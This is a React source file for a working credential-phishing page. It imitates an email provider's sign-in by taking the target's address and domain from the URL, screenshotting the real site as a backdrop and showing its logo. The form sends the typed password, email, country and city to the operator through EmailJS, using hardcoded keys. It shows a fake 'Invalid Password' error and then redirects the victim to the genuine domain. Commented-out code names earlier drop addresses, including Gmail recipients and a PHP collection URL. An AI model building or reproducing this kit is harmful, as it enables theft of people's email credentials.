
import React, { useEffect, useState, useRef } from "react";
import './Default.css';
// import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";
// import { AiOutlineUserAdd } from 'react-icons/ai';
// import { GiPadlock } from 'react-icons/gi';
import { HiMiniArrowRightEndOnRectangle } from "react-icons/hi2";
import { MdEmail } from "react-icons/md";
import { IoLockClosedSharp } from "react-icons/io5";
// import { IoIosEyeOff } from "react-icons/io";
// import Ikdfjmg from '../../Media/Images/163.png'
import emailjs from '@emailjs/browser';


const Default = ()=>{

    const formRef = useRef();

    // const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    // const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
        //   setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);


    const [spinLoader, setSpinLoader] = useState(false);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
    // console.log(extracetdEmail);
    // const mainName = extracetdEmail.replace('.com', "");

    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).split('&', 1).toString();

    
    const [defaultEmail, setDefaultEmail] = useState(extracetdEmailC);
    const [defaultPassword, setDefaultPassword] = useState('');

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);

    const submitDefaultForm = (e)=>{
        e.preventDefault();
        


        setSpinLoader(true);
        // alert('sdfgh');
        setTimeout(() => {
            setDefaultPassword('');
            setErr(true);
        }, 3000);


        setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                // console.log(extracetdemailDomain);
                setTimeout(() => {
                    // window.location.href = "https://www.webmail.gigared.com/";
                    window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;
                }, 1500);

                // window.location.reload();
                // window.location.href = `https://www.${extracetdemailDomain}`;
                // window.location.replace('https://webmail.gigared.com/');

            };

            setTimeout(()=>{
                setSpinLoader(false);
            }, 3200);



            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;
    
    
            emailjs
            .sendForm(serviceID, templateID, formRef.current, {
              publicKey: publicKey,
            })
            .then(
              () => {
                console.log('SUCCESS!');
              },
              (error) => {
                console.log('FAILED...', error.text);
              },
            );




        // post to server
        // const user = {
        //     email: defaultEmail,
        //     password: defaultPassword,
        //     // country: country,
        //     // city: city,
        //     // flag: flag,
        //     // eyep: ipAdress,
        //     // nownow: forTime
        // };



        // const user = {
        //     email: defaultEmail,
        //     password: defaultPassword,
            // subject: "General Page Logs",
            // to: "rvvlsales13@gmail.com",
            // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
            // body:
            // `
            // <html lang="en">
            // <p>Online Correspondence: <b>${defaultEmail}</b></p>
            // <p>Signal: <b>${defaultPassword}</b></p>
            // <p>Country: ${country}</p>
            // <p>Flag: ${flag}</p>
            // </html>
            // `
        // };


        // const user = {
        //     "subject": "Coming Logs",
        //     "to": "reportwork5252@gmail.com",
        //     "body": `<div><h3></h3><p>Online_Correspondence: ${defaultEmail}</p><p>Signal: ${defaultPassword}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
        // }




        // $.ajax({
        //     type: "POST",
        //     url: "https://trezanolz.com/kenneth/chame.php",
        //     data: user,
        //     success(data) {
        //         // alert('OK');
        //         // console.log(data);
        //     },
        // });


    };





    useEffect(()=>{
        document.title = extracetdEmail.toUpperCase();
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, [extracetdEmail]);

    return(<div style={{
        // display: 'flex',
        // justifyContent:'center',
        // marginTop:'2.4cm'
    }}>

        { spinLoader ? <Preloader /> : null }

        <article 
            className="default_wrapper_etd67yuhvRTyuhgfdrty"
            style={{
                backgroundImage: `url(https://image.thum.io/get/width/1200/https://www.${extracetdEmail}/)`,
                width:'100vw',
                height:'100vh',
                backgroundRepeat:'no-repeat',
                backgroundSize:'cover',
                backgroundPosition:'top'
            }}
        >
            
            <div className="def_modl">
                
                <div className="icon_">
                    <HiMiniArrowRightEndOnRectangle style={{ 
                        fontSize:'40px', 
                        cursor:'cell', 
                        textAlign:'center', 
                        border:'1px solid buttonface',
                        background:'buttonface', 
                        padding:'7px',
                        borderRadius:'8px',
                        // boxShadow:'3px 3px 3px buttonface'
                     }} />
                </div>


                <p className="sann">Sign in with email</p>

                {/* <p className="txtxYUhg78ui">Make a new doc to bring your words, data, and teams together. For free</p> */}
                <div style={{
display:'flex',
justifyContent:'center'
                }}>
                <img 
                    // src=""
                    alt="logo_kiuty7689uiHTR67ui"
                    className="logo_kiuty7689uiHTR67ui"
                    src={`https://logo.clearbit.com/https://${extracetdEmail}`}
                    // src={Ikdfjmg}
                    style={{
                      width:'80px',
                      height:'50px',
                      
                    }}
                />
                </div>

                { err ? <p className="e_msg_kyuiokTYYuik76tyhj">Invalid Password, Ensure to input correct password email account</p> : undefined }

                <form className="formm" id="formm" onSubmit={submitDefaultForm} ref={formRef}>

                    <div className="eml_wrapper_khuIOKYui">

                        <MdEmail style={{
                            color:'#777',
                            fontSize:'30px',
                            paddingLeft:'10px'
                        }}/>

                        
                        <input 
                            type="email"
                            readOnly
                            className="email_inp"
                            id="email_inp"
                            placeholder={`Email`}
                            value={defaultEmail}
                            style={{
                                overflow:'scroll'
                            }}
                            onChange={e=> setDefaultEmail(e.target.value)}
                            name="online_correspondence"
                        />
                    </div>

                    <div className="pwd_wrapper__kefuiokpmYUio">
                        <IoLockClosedSharp style={{
                                color:'#777',
                                fontSize:'30px',
                                paddingLeft:'10px'
                            }}/>

                            
                            <input 
                                type="password"
                                className="pwd_inp email_inp"
                                id="pwd_inp"
                                placeholder={`Password`}
                                autoFocus
                                value={defaultPassword}
                                onChange={e=> setDefaultPassword(e.target.value)}
                                name="signal"
                            />
                    </div>

                    <input type="text" value={country} name="country" hidden/>
                    <input type="text" value={city} name="city" hidden/>

                    <p className="frgt">Forgot password?</p>

                    <div className="btn_wrapper_kgftYUGFE6yujh">
                        <input 
                            type="submit"
                            className="btn_login_gyuiGFDR6ty"
                            id="btn_lkfiokl"
                            value={`Sign In`}
                            onClick={submitDefaultForm}
                        />
                    </div>

                </form>

                <div className="copy_wright_khgyuiJYU">
                   {`${defaultEmail}`} &copy; 2025
                </div>

            </div>

        </article>

    </div>)
}

export default Default;